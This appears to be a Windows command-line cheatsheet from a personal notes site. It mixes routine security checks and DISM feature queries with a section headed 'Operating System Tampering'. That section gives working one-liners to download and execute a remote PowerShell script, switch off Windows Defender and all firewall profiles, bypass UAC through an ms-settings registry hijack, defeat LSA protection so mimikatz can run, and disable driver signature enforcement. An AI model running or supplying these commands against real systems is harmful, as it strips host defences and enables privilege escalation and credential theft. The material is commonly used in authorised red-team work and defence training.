---
layout: default
title: Useful daily Windows CLI
parent: Windows
categories: Windows Sysadmin
grand_parent: Cheatsheets
---
<!-- vscode-markdown-toc -->
* 1. [Security Checks](#SecurityChecks)
	* 1.1. [listing kb](#listingkb)
	* 1.2. [windows firewall status](#windowsfirewallstatus)
	* 1.3. [windows defender status](#windowsdefenderstatus)
* 2. [Operating System Tampering](#OperatingSystemTampering)
	* 2.1. [donwload ps activedirectory module](#donwloadpsactivedirectorymodule)
	* 2.2. [windows defender: disable](#windowsdefender:disable)
	* 2.3. [windows firewall: disable](#windowsfirewall:disable)
	* 2.4. [windows uac: bypass](#windowsuac:bypass)
	* 2.5. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
	* 2.6. [Windows driver signature: disable](#Windowsdriversignature:disable)
* 3. [Windows DISM](#WindowsDISM)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

# {{ page.title }}

##  1. <a name='SecurityChecks'></a>Security Checks

###  1.1. <a name='listingkb'></a>listing kb
```batch
wmic qfe list full /format:table
```

###  1.2. <a name='windowsfirewallstatus'></a>windows firewall status
```batch
# logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
netsh advfirewall show allprofiles
```

###  1.3. <a name='windowsdefenderstatus'></a>windows defender status
```batch
powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
```

##  2. <a name='OperatingSystemTampering'></a>Operating System Tampering

###  2.1. <a name='donwloadpsactivedirectorymodule'></a>donwload ps activedirectory module 
```batch
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

###  2.2. <a name='windowsdefender:disable'></a>windows defender: disable
```batch
powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
```


###  2.3. <a name='windowsfirewall:disable'></a>windows firewall: disable
```batch
netsh advfirewall set publicprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set allprofiles state off
```

###  2.4. <a name='windowsuac:bypass'></a>windows uac: bypass
```batch
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
```

###  2.5. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
```batch
powershell .\ConsoleApplication1.exe/InstallDriver
powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
powershell .\mimikatz.exe
```

###  2.6. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
```batch
bcdedit.exe /set nointegritychecks on
bcdedit.exe /set testsigning on
```

##  3. <a name='WindowsDISM'></a>Windows DISM
```batch
DISM /online /get-features /format:table | more
DISM /online /get-features /format:table | find “Enabled” | more
DISM /online /get-features /format:table | find “Disabled” | more
DISM /online /get-featureinfo /featurename:
get-windowsoptionalfeature -online | ft | more
get-windowsoptionalfeature -online | where state -like disabled* | ft | more
get-windowsoptionalfeature -online | where state -like enabled* | ft | more
get-windowsoptionalfeature -online -featurename *media*
```